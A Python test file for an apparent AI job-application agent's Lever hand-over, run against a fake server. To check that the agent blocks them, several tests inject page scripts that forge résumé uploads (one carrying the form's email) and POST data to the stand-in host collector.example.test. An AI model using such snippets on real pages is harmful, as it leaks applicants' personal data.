"""Finish in browser on Lever, in a real Chromium against FakeLever (skipped without Chromium, required in CI's `browser-python`).

docs/phase5-lever-handoff-spec.md 10.4 items 6, 7, 11, 14 and 15 (items 12 and 13 are in test_apply_lever_browser.py, item 16 beside them), and the wiring of the outcome
table of 6.13 into the agent. The agent is the real one with the real Lever adapter and request policy; pages are served by ``FakeLever`` through the
agent's ``route_hook``, so ``route_decision`` runs first and only what it lets through reaches the fake. The student is a ``student_hook`` that completes
what the app left and presses Lever's own Submit in the window, as the person would; the agent itself never presses it (``go`` checks the agent's own record of what it clicked).

The hand-over is a function the test gives the agent, standing for the parent's commit: it notes how many application POSTs had reached the fake when it
was asked, which is what "only then does the POST continue" means. The runner, the child process and the claim are in test_apply_lever_handoff_e2e.py.
Every company, person and address is fictional.
"""

import dataclasses
import hashlib
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

import realdata_guard

realdata_guard.install()

from apply_fake_ats import LEVER_APPLY_URL, FakeLever
from browser_support import requires_chromium
from test_apply_lever_browser import FORM_VALUES_JS, TIMEOUTS, LeverAgent, lever_sources, planner, resume_payload

from opportunity_app.apply import agent as apply_agent
from opportunity_app.apply.agent_types import HANDOFF_NOT_SUBMITTED
from opportunity_app.apply.checks import UNCONFIRMED_NOTE
from opportunity_app.apply.lever_adapter import LeverAdapter

HANDOFF = dataclasses.replace(TIMEOUTS, handoff_s=8.0, outcome_s=4.0)
WITH_RESUME = " Lever received your résumé."
STUDENTS_FILE = b"%PDF-1.4 a fictional resume the student picked in the window"
STUDENTS_SHA = hashlib.sha256(STUDENTS_FILE).hexdigest()


def complete(page):
    """What the person does first: the company, which the form requires and the app has no confirmed fact for."""
    page.fill('[name="org"]', "Fictional Employer")


def press(page):
    page.click("#btn-submit")


class Student:
    """A person in the window: ``steps`` is a list of (step the agent is in, what they do) run once each, in order, when the agent next asks for them."""

    def __init__(self, *steps):
        self.steps = list(steps)
        self.done = []

    def __call__(self, page, step, seen):
        if self.steps and self.steps[0][0] == step:
            _, act = self.steps.pop(0)
            self.done.append(act.__name__)
            act(page, seen)


def completes_and_presses(page, seen):
    complete(page)
    press(page)


def presses_again(page, seen):
    """The form was drawn again, empty: the student fills what it requires and presses once more."""
    page.fill('[name="name"]', "Sam Rivera")
    page.fill('[name="email"]', "sam.rivera@example.test")
    page.fill('[name="phone"]', "555-0100")
    complete(page)
    press(page)


def closes_the_window(page, seen):
    page.close()


def asks_to_stop(page, seen):
    seen["stop"] = True


@requires_chromium
class LeverHandoffCase(unittest.TestCase):
    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.addCleanup(self.tempdir.cleanup)
        self.dir = Path(self.tempdir.name)

    def students_file(self):
        path = self.dir / "Picked In The Window.pdf"
        path.write_bytes(STUDENTS_FILE)
        return path

    def file_named(self, name, data):
        """A file on disk: a path, not an in-memory payload, so the browser's events for it are trusted ones, as a picked file's are."""
        path = self.dir / name
        path.write_bytes(data)
        return path

    def attach(self, page, seen):
        """The student chooses a file in the form's file box (a path, so the browser's own events are trusted ones, as a picked file's are)."""
        page.set_input_files('input[name="resume"]', str(self.students_file()))

    def go(self, fake=None, *, page="demo_eeo_survey.html", src=None, files="default", student=None, timeouts=None, hand_over="commit", adapter=None):
        """One handoff run against the fake. ``student`` is a callable ``(page, step, seen)``; ``hand_over`` is "commit", "refuse", "raise" or a callable."""
        fake = fake or FakeLever(page=page)
        self.addCleanup(fake.drop_unanswered)
        src = src or lever_sources()
        schema, draft, replan = planner(src, page)
        files = {"resume": resume_payload()} if files == "default" else files
        steps, texts, asked = [], {}, []
        seen = {}

        def committed():
            asked.append(len(fake.apply_posts()))
            if hand_over == "raise":
                raise RuntimeError("no answer")
            return hand_over == "commit"

        def hook(browser_page, step):
            if step == "handoff" and "form" not in seen:
                seen["form"] = browser_page.evaluate(FORM_VALUES_JS)
                seen["required_after_tick"] = browser_page.evaluate("() => Array.from(document.querySelectorAll('.required-field input[type=checkbox]')).map((e) => e.required)")
            if student:
                student(browser_page, step, seen)

        def progress(step, text):
            steps.append(step)
            texts[step] = text

        agent = LeverAgent(
            fake=fake, mode="handoff", adapter=adapter or LeverAdapter(), run_id="run-test", screenshot_dir=self.dir, timeouts=timeouts or HANDOFF,
            on_progress=progress, heartbeat=lambda: None, student_hook=hook,
        )
        with agent:
            result = agent.run(
                draft, page_url=LEVER_APPLY_URL, schema=schema, files=files, replan=replan,
                hand_over=hand_over if callable(hand_over) else committed, cancelled=lambda: bool(seen.get("stop")),
            )
        # The promise of this milestone, whatever the test was about: the agent pressed none of the controls it must never press. Only the student did. (The
        # fake's own count of clicks is lost when the page is replaced by a /thanks page, so the agent's own record of what it clicked is the check.)
        self.assertEqual({kind for kind in agent.keys_of_kind("click")} - {"click:option_pick"}, set(), "the app clicked something but an option of a list")
        self.assertEqual(agent.pressed.get("hiddenSubmit", 0), 0, "the app pressed the page's hidden submit")
        self.assertEqual(agent.pressed.get("cookie", 0), 0, "the agent pressed the cookie banner")
        self.assertEqual(agent.pressed.get("challenge", 0), 0, "the agent pressed inside a challenge")
        return SimpleNamespace(result=result, fake=fake, agent=agent, steps=steps, texts=texts, asked=asked, seen=seen)

    @staticmethod
    def refused(run, **match):
        return [item for item in run.result.refused if all(item.get(name) == value for name, value in match.items())]

    @staticmethod
    def left(run):
        return {item["key"]: item["reason"] for item in run.result.evidence["left_for_you"]}


# --- Item 6: the hand-over ------------------------------------------------------------------------------------------------------------

class HandOverTests(LeverHandoffCase):
    def test_the_press_reaches_the_handler_the_parent_commits_and_only_then_the_post_continues(self):
        run = self.go(student=Student(("handoff", completes_and_presses)))
        self.assertEqual(run.asked, [0], "the parent was asked once, before any application POST had reached Lever")
        (post,) = run.fake.apply_posts()
        self.assertEqual(post.status, 200)
        self.assertEqual((post.part("org").text, post.part("name").text), ("Fictional Employer", "Sam Rivera"))
        result = run.result
        self.assertEqual((result.outcome, result.handed_over, result.after_click, result.confirmation_seen), ("submitted", True, True, True))
        evidence = result.evidence
        self.assertEqual((evidence["handoff_end"], evidence["submit_post"], evidence["submit_continued"], evidence["form_absent"]), ("posted", True, True, True))
        self.assertEqual(evidence["confirmation_path"], "/harbordemo/6f1d2c3b-4a59-4687-8c7d-9e0f1a2b3c4d/thanks")
        self.assertEqual(evidence["browser_closed"], True)
        self.assertEqual(run.steps[-2:], ["your_turn", "submitting"])
        self.assertEqual(self.refused(run, rule="hand_over_refused"), [])

    def test_a_false_reply_aborts_the_post_and_nothing_reaches_lever(self):
        run = self.go(student=Student(("handoff", completes_and_presses)), hand_over="refuse")
        self.assertEqual(run.asked, [0])
        self.assertEqual(run.fake.apply_posts(), [], "the application POST went out although the hand-over was refused")
        result = run.result
        self.assertEqual((result.outcome, result.handed_over, result.after_click), ("needs_you", False, False))
        self.assertEqual(result.reasons, ["The app couldn't record this submission, so it stopped it. Your application was not sent. Lever received your résumé. Try again."])
        self.assertEqual((result.evidence["handoff_end"], result.evidence["submit_continued"]), ("refused", False))
        self.assertEqual(len(self.refused(run, rule="hand_over_refused", host="jobs.lever.co")), 1)

    def test_no_answer_is_no(self):
        run = self.go(student=Student(("handoff", completes_and_presses)), hand_over="raise")
        self.assertEqual(run.fake.apply_posts(), [])
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.evidence["handoff_end"]), ("needs_you", False, "refused"))

    def test_a_second_press_after_the_first_passed_is_aborted_and_the_parent_is_asked_once(self):
        fake = FakeLever("form_again")
        student = Student(("handoff", completes_and_presses), ("outcome", presses_again))
        run = self.go(fake, student=student)
        self.assertEqual(student.done, ["completes_and_presses", "presses_again"], "the student pressed twice")
        self.assertEqual(run.asked, [0], "the parent was asked about the first POST and not about the second")
        self.assertEqual(len(fake.apply_posts()), 1, "a second application POST reached Lever")
        self.assertEqual(len(self.refused(run, rule="second_submit_post")), 1)
        self.assertEqual((run.result.outcome, run.result.after_click), ("unconfirmed", True), "a 2xx that left the form on the page is not a confirmation")

    def test_a_closed_window_settles_needs_you_with_nothing_sent_and_no_click(self):
        run = self.go(student=Student(("handoff", closes_the_window)))
        result = run.result
        self.assertEqual((result.outcome, result.handed_over, result.after_click), ("needs_you", False, False))
        self.assertEqual(result.reasons, [HANDOFF_NOT_SUBMITTED + WITH_RESUME])
        self.assertEqual((result.evidence["handoff_end"], run.asked, run.fake.apply_posts()), ("closed", [], []))

    def test_stop_settles_needs_you_with_nothing_sent_and_no_click(self):
        run = self.go(student=Student(("handoff", asks_to_stop)))
        result = run.result
        self.assertEqual((result.outcome, result.handed_over, result.after_click), ("needs_you", False, False))
        self.assertEqual(result.reasons, [HANDOFF_NOT_SUBMITTED + WITH_RESUME])
        self.assertEqual((result.evidence["handoff_end"], result.evidence["browser_closed"], run.asked), ("stopped", True, []))

    def test_a_student_who_never_presses_runs_out_the_window_and_nothing_is_sent(self):
        run = self.go(timeouts=dataclasses.replace(HANDOFF, handoff_s=2.0))
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.evidence["handoff_end"]), ("needs_you", False, "timeout"))
        self.assertEqual((run.asked, run.fake.apply_posts()), ([], []))


# --- Item 7: the outcome table, as the agent applies it -------------------------------------------------------------------------------------

class OutcomeTests(LeverHandoffCase):
    def press(self, fake, **kwargs):
        return self.go(fake, student=Student(("handoff", completes_and_presses)), **kwargs)

    def test_a_post_answered_ok_that_ends_on_the_postings_thanks_page_with_no_form_is_submitted(self):
        run = self.press(FakeLever("to_thanks"))
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.reasons), ("submitted", True, []))
        self.assertTrue(run.result.confirmation_seen)

    def test_a_confirmation_that_appears_in_place_with_no_visit_to_thanks_is_not_one(self):
        run = self.press(FakeLever("thanks_in_place"))
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.confirmation_seen), ("unconfirmed", True, False))
        self.assertEqual(run.result.reasons, [UNCONFIRMED_NOTE.format(ats="Lever")])

    def test_a_form_drawn_again_after_an_ok_answer_is_unconfirmed(self):
        run = self.press(FakeLever("form_again"))
        self.assertEqual((run.result.outcome, run.result.after_click), ("unconfirmed", True))
        self.assertEqual(run.result.evidence["submit_status"], 200)

    def test_a_refusal_with_the_form_still_there_is_failed_and_names_the_field_never_the_text(self):
        fake = FakeLever("refused_4xx")
        fake.invalid_field = "email"
        run = self.press(fake)
        result = run.result
        self.assertEqual((result.outcome, result.after_click, result.evidence["submit_status"]), ("failed", True, 422))
        self.assertEqual(result.reasons, ['Lever refused the form (HTTP 422). Lever marked "Email" as wrong'])
        self.assertNotIn("Please check", " ".join(result.reasons), "the page's own wording is never used")

    def test_a_server_error_is_unconfirmed_never_failed(self):
        run = self.press(FakeLever("server_5xx"))
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.evidence["submit_status"]), ("unconfirmed", True, 500))

    def test_a_challenge_before_any_press_is_not_an_outcome_and_the_run_stays_the_students(self):
        fake = FakeLever()
        fake.challenge = True
        run = self.go(fake, student=Student(("handoff", completes_and_presses)))
        self.assertEqual(run.asked, [], "the page showed its check and the form was never sent")
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.evidence["handoff_end"]), ("needs_you", False, "timeout"))
        self.assertEqual(run.fake.apply_posts(), [])


# --- Item 11: the student's own attach -----------------------------------------------------------------------------------------------------

class SmallLimitAdapter(LeverAdapter):
    """Lever's adapter for a page whose limit on a file is 64 bytes (the fake's setting), so a test need not make a file of a hundred megabytes."""
    file_limit_bytes = 64


class StudentAttachTests(LeverHandoffCase):
    def test_a_file_the_student_chooses_is_read_by_the_page_the_post_passes_and_the_app_names_the_fields_lever_changed(self):
        fake = FakeLever()
        run = self.go(fake, src=lever_sources(upload=False), files={}, student=Student(("handoff", self.attach)))
        (post,) = fake.parse_posts()
        self.assertEqual(post.status, 200, "the page's read of the student's file was let through")
        result = run.result
        self.assertEqual(result.evidence["resume_sent_to_lever"], False, "the app attached nothing")
        self.assertEqual(result.evidence["student_attached_resume"], {"count": 1, "sha256": STUDENTS_SHA, "changed": ["location", "org"]})
        self.assertIn("resume_attached", run.steps)
        self.assertEqual(run.steps[-1], "resume_changed")
        self.assertEqual(run.texts["resume_changed"], "Lever filled Current location and Current company from the résumé you attached. Check them before you press Submit application")
        left = self.left(run)
        for name in ("location", "org"):
            self.assertEqual(left[f"read:{name}"], "Lever filled this from the résumé you attached. Check it before you press Submit application.")
        for name in ("name", "email", "phone"):
            self.assertNotIn(f"read:{name}", left, "a field the reader left alone is not named")
        self.assertNotIn("Sam", " ".join(run.texts.values()), "names, never values")
        self.assertEqual(result.reasons, [HANDOFF_NOT_SUBMITTED + WITH_RESUME], "Lever has the file now, whoever attached it")

    def test_one_changed_field_is_said_in_the_singular(self):
        fake = FakeLever()
        fake.page = "demo_eeo_survey.html"
        # The student has typed a company already; the page's reader leaves a field the student made their own.
        def types(page, seen):
            page.fill('[name="org"]', "Fictional Employer")
            page.press('[name="org"]', "Tab")

        run = self.go(fake, src=lever_sources(upload=False), files={}, student=Student(("handoff", types), ("handoff", self.attach)))
        self.assertEqual(run.result.evidence["student_attached_resume"]["changed"], ["location"])
        self.assertEqual(run.texts["resume_changed"], "Lever filled Current location from the résumé you attached. Check it before you press Submit application")

    def test_the_students_file_is_then_part_of_a_normal_submission(self):
        student = Student(("handoff", self.attach), ("handoff", completes_and_presses))
        run = self.go(student=student, src=lever_sources(upload=False), files={})
        self.assertEqual(run.result.outcome, "submitted")
        self.assertEqual(run.result.evidence["student_attached_resume"]["count"], 1)
        self.assertEqual(len(run.fake.parse_posts()), 1)

    def test_a_script_cannot_stand_in_for_the_student_a_read_the_student_did_not_ask_for_is_aborted(self):
        def forged(page, seen):
            page.evaluate("""() => { const data = new FormData(); data.append('resume', new Blob(['%PDF-1.4 sent by a script']), 'x.pdf');
              data.append('accountId', document.querySelector('[name=accountId]').value); return fetch('/parseResume', {method: 'POST', body: data}).catch(() => 0); }""")

        run = self.go(src=lever_sources(upload=False), files={}, student=Student(("handoff", forged)))
        self.assertEqual(run.fake.parse_posts(), [], "a file went to Lever that the student never chose")
        self.assertEqual(len(self.refused(run, rule="resume_post_unasked")), 1)
        self.assertNotIn("student_attached_resume", run.result.evidence)
        self.assertEqual(run.result.evidence["resume_sent_to_lever"], False)

    FORGED = """() => { const data = new FormData(); data.append('resume', new Blob(['answers: ' + document.querySelector('[name=email]').value]), 'x.pdf');
      data.append('accountId', document.querySelector('[name=accountId]').value); return fetch('/parseResume', {method: 'POST', body: data}).catch(() => 0); }"""

    def test_a_file_chosen_in_another_file_box_opens_no_read_for_a_script_to_use(self):
        """The cover letter box (a card on the page) is not read by Lever's reader: choosing a file there must not leave an allowance behind."""
        def cover_letter_then_forged(page, seen):
            page.set_input_files('input[name^="cards["][type=file]', str(self.file_named("letter.pdf", b"%PDF-1.4 a fictional cover letter")))
            page.evaluate(self.FORGED)

        run = self.go(page="cards_files_consent.html", src=lever_sources(upload=False), files={}, student=Student(("handoff", cover_letter_then_forged)))
        self.assertEqual(run.fake.parse_posts(), [], "a script's file reached Lever after the student chose a cover letter")
        self.assertEqual(len(self.refused(run, rule="resume_post_unasked")), 1)
        self.assertNotIn("student_attached_resume", run.result.evidence)

    def test_a_resume_over_the_pages_limit_opens_no_read_for_a_script_to_use(self):
        """The page shows 'too big' and sends nothing for it; the choice must not leave an allowance behind."""
        fake = FakeLever()
        fake.max_upload_bytes = 64

        def too_big_then_forged(page, seen):
            page.set_input_files('input[name="resume"]', str(self.file_named("big.pdf", b"%PDF-1.4 " + b"x" * 200)))
            page.evaluate(self.FORGED)

        run = self.go(fake, src=lever_sources(upload=False), files={}, adapter=SmallLimitAdapter(), student=Student(("handoff", too_big_then_forged)))
        self.assertEqual(fake.parse_posts(), [], "a script's file reached Lever after the student chose a file the page refused")
        self.assertEqual(len(self.refused(run, rule="resume_post_unasked")), 1)

    def test_a_choice_no_read_used_runs_out_so_a_later_script_cannot_use_it(self):
        fake = FakeLever()
        # A page whose reader never runs for this file box: the choice is then one no read will use.
        fake.inject.append("window.addEventListener('change', function (e) { if (e.target && e.target.name === 'resume') e.stopImmediatePropagation(); }, true);")

        def chosen_then_later_forged(page, seen):
            page.set_input_files('input[name="resume"]', str(self.students_file()))
            page.wait_for_timeout(900)
            page.evaluate(self.FORGED)

        with mock.patch.object(apply_agent, "STUDENT_FILE_WINDOW_S", 0.3):
            run = self.go(fake, src=lever_sources(upload=False), files={}, student=Student(("handoff", chosen_then_later_forged)))
        self.assertEqual(fake.parse_posts(), [], "a script's file reached Lever after the student's choice had run out")
        self.assertEqual(len(self.refused(run, rule="resume_post_unasked")), 1)

    def test_after_a_cover_letter_the_record_names_the_resume_lever_received(self):
        """A cover letter, then a résumé: the record names the résumé (the file Lever read), not the first file chosen."""
        def cover_letter_then_resume(page, seen):
            page.set_input_files('input[name^="cards["][type=file]', str(self.file_named("letter.pdf", b"%PDF-1.4 a fictional cover letter")))
            page.set_input_files('input[name="resume"]', str(self.students_file()))

        run = self.go(page="cards_files_consent.html", src=lever_sources(upload=False), files={}, student=Student(("handoff", cover_letter_then_resume), ("handoff", completes_and_presses)))
        self.assertEqual(len(run.fake.parse_posts()), 1)
        self.assertEqual(run.result.evidence["student_attached_resume"]["sha256"], STUDENTS_SHA)

    def test_a_change_event_a_script_fires_is_not_the_students_choice(self):
        def scripted(page, seen):
            page.evaluate("""() => { const box = document.querySelector('input[name=resume]'); const list = new DataTransfer();
              list.items.add(new File(['%PDF-1.4 set by a script'], 'script.pdf', {type: 'application/pdf'})); box.files = list.files;
              box.dispatchEvent(new Event('change', {bubbles: true})); }""")

        run = self.go(src=lever_sources(upload=False), files={}, student=Student(("handoff", scripted)))
        self.assertEqual(run.fake.parse_posts(), [], "the page's read of a file a script set was let through")
        self.assertEqual(len(self.refused(run, rule="resume_post_unasked")), 1)

    def test_before_the_students_turn_the_same_request_is_aborted(self):
        fake = FakeLever()
        fake.challenge_during_fill = (0.0, 2.0)   # the app waits in its fill, which gives the student a tick in the window before their turn
        run = self.go(fake, src=lever_sources(upload=False), files={}, student=Student(("challenge", self.attach)))
        self.assertEqual(fake.parse_posts(), [])
        self.assertEqual(len(self.refused(run, rule="resume_post_off")), 1)
        self.assertNotIn("student_attached_resume", run.result.evidence)

    def test_after_hand_over_the_same_request_is_aborted(self):
        fake = FakeLever("form_again")
        student = Student(("handoff", completes_and_presses), ("outcome", self.attach))
        run = self.go(fake, src=lever_sources(upload=False), files={}, student=student)
        self.assertEqual(fake.parse_posts(), [], "a file went to Lever after the application was handed over")
        self.assertEqual(len(self.refused(run, host="jobs.lever.co", rule="other_non_get")), 1)
        self.assertEqual(run.result.outcome, "unconfirmed")
        self.assertNotIn("student_attached_resume", run.result.evidence)


# --- Item 15: the words ---------------------------------------------------------------------------------------------------------------------

class WordsTests(LeverHandoffCase):
    ENDINGS = (
        ("the window closed", Student(("handoff", closes_the_window))),
        ("the student pressed Stop", Student(("handoff", asks_to_stop))),
        ("the time ran out", None),
        ("the hand-over was refused", Student(("handoff", completes_and_presses))),
    )

    def run_ending(self, label, student, **kwargs):
        timeouts = dataclasses.replace(HANDOFF, handoff_s=2.0) if student is None else HANDOFF
        return self.go(student=student, timeouts=timeouts, hand_over="refuse" if label.startswith("the hand-over") else "commit", **kwargs)

    def test_with_no_file_sent_every_ending_before_a_press_says_the_application_was_not_sent_and_never_that_lever_has_the_file(self):
        for label, student in self.ENDINGS:
            with self.subTest(ending=label):
                run = self.run_ending(label, student, src=lever_sources(upload=False), files={})
                self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
                (reason,) = run.result.reasons
                self.assertRegex(reason, r"(?i)not sent|nothing was sent")
                self.assertNotIn("résumé", reason)
                self.assertEqual(run.fake.parse_posts(), [])

    def test_after_the_app_attached_the_file_every_such_ending_says_lever_received_it(self):
        for label, student in self.ENDINGS:
            with self.subTest(ending=label):
                run = self.run_ending(label, student)
                self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
                (reason,) = run.result.reasons
                self.assertIn("Your application was not sent. Lever received your résumé.", reason)
                self.assertNotIn("Nothing was sent", reason)
                self.assertEqual(len(run.fake.parse_posts()), 1)

    def test_after_the_student_attached_the_file_in_the_window_they_say_it_too(self):
        run = self.go(src=lever_sources(upload=False), files={}, student=Student(("handoff", self.attach), ("handoff", closes_the_window)))
        (reason,) = run.result.reasons
        self.assertEqual(reason, HANDOFF_NOT_SUBMITTED + WITH_RESUME)
        self.assertEqual(run.result.evidence["resume_sent_to_lever"], False)
        self.assertEqual(run.result.evidence["student_attached_resume"]["count"], 1)

    def test_a_press_the_page_never_sent_still_says_the_file_went_and_the_application_did_not(self):
        fake = FakeLever()
        fake.hcaptcha_posts_refused = True    # Submit does nothing: the page never posts
        run = self.go(fake, student=Student(("handoff", completes_and_presses)))
        self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
        self.assertEqual(run.result.reasons, [HANDOFF_NOT_SUBMITTED + WITH_RESUME])


class PressNoticeTests(LeverHandoffCase):
    def test_a_request_to_an_unknown_address_after_the_students_press_is_refused_and_the_student_is_told(self):
        fake = FakeLever()
        fake.hcaptcha_posts_refused = True    # the page itself posts nothing, so the only form body that leaves is the page script's

        def presses_then_the_page_posts_elsewhere(page, seen):
            complete(page)
            press(page)
            page.evaluate("""() => fetch('https://collector.example.test/x', {method: 'POST', headers: {'content-type': 'application/json'}, body: JSON.stringify({a: 1})}).catch(() => 0)""")

        run = self.go(fake, student=Student(("handoff", presses_then_the_page_posts_elsewhere)))
        self.assertIn("form_elsewhere", run.steps)
        self.assertIn("collector.example.test", run.texts["form_elsewhere"])
        self.assertTrue(self.refused(run, host="collector.example.test"))


# --- Item 14: keystrokes ------------------------------------------------------------------------------------------------------------------------

class KeystrokeTests(LeverHandoffCase):
    def test_the_location_search_starts_from_key_events_only_and_the_adapter_does_not_rely_on_fill(self):
        run = self.go()
        self.assertEqual(len(run.fake.search_gets()), 1, "the app's one search came from real key presses")
        self.assertEqual(run.seen["form"]["location"], "Springfield, Example State, United States")
        # The page's own rule, proved here against the same fake: a value set the way fill() sets it starts no search.
        probe = FakeLever()
        self.addCleanup(probe.drop_unanswered)
        from playwright.sync_api import sync_playwright

        with sync_playwright() as playwright:
            browser = playwright.chromium.launch()
            try:
                context = browser.new_context()
                probe.install(context)
                page = context.new_page()
                page.goto(LEVER_APPLY_URL)
                page.wait_for_selector('[name="location"]')
                page.fill('[name="location"]', "Springfield")
                page.wait_for_timeout(1500)
                self.assertEqual(probe.search_gets(), [], "fill() started a search: the app could be relying on it without knowing")
                page.focus('[name="location"]')
                page.press('[name="location"]', "x")
                page.wait_for_timeout(1500)
                self.assertEqual(len(probe.search_gets()), 1, "a key press starts one")
            finally:
                browser.close()


if __name__ == "__main__":
    unittest.main()
